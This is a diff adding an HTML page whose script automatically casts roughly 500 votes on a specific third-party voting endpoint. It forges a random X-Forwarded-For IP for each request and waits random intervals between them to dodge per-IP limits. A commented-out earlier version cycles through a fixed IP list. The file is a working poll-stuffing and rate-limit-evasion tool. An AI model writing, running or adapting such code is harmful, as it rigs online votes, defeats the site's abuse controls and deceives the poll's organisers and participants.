@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+
+</head>
+<body>
+
+</body>
+<script>
+    // 设置 IP组
+    // var ipList = [
+    //     '116.62.184.61', '116.62.184.65', '116.62.184.68', '116.62.184.160'
+    // ];
+    // ipList.forEach(function (ip) {
+    //     var xhr = new XMLHttpRequest();
+    //     xhr.open("GET", 'http://cxwh.kexing100.com:82/index.php?app_ajax=1&app_act=vote&id=328&itemid=1', true);
+    //     xhr.setRequestHeader('X-Forwarded-For', ip);
+    //     xhr.send();
+    //     xhr.onreadystatechange = function () {
+    //         if (xhr.readyState == 4) {
+    //             console.log(xhr.responseText);
+    //         }
+    //     }
+    // });
+
+    // 设置随机IP
+
+    (function () {
+
+        var count = 0;
+        var max = 500;  //投票次数
+
+        // 生成随机IP
+        function r(min, max) {
+            return Math.floor(min + Math.random() * (max - min));
+        }
+
+        function getRandomIp() {
+            return r(1, 255) + "." + r(1, 255) + "." + r(1, 255) + "." + r(1, 255);
+        }
+
+        // 随机时间后 执行投票
+        function vote(timer) {
+            count++;
+            var ip = getRandomIp();
+            setTimeout(function () {
+                // 生成随机时间  1 秒到 10 秒不等
+                var new_timer = r(1000 * 1, 10 * 1000);
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", 'http://cxwh.kexing100.com:82/index.php?app_ajax=1&app_act=vote&id=328&itemid=1', true);
+                xhr.setRequestHeader('X-Forwarded-For', ip);
+                xhr.send();
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState == 4) {
+                        console.log(xhr.responseText);
+                        if (count <= max) {
+                            vote(new_timer);
+                        }
+                    }
+                }
+            }, timer);
+        }
+
+        // 开始投票
+        vote(1);
+
+    })();
+
+</script>
+</html>
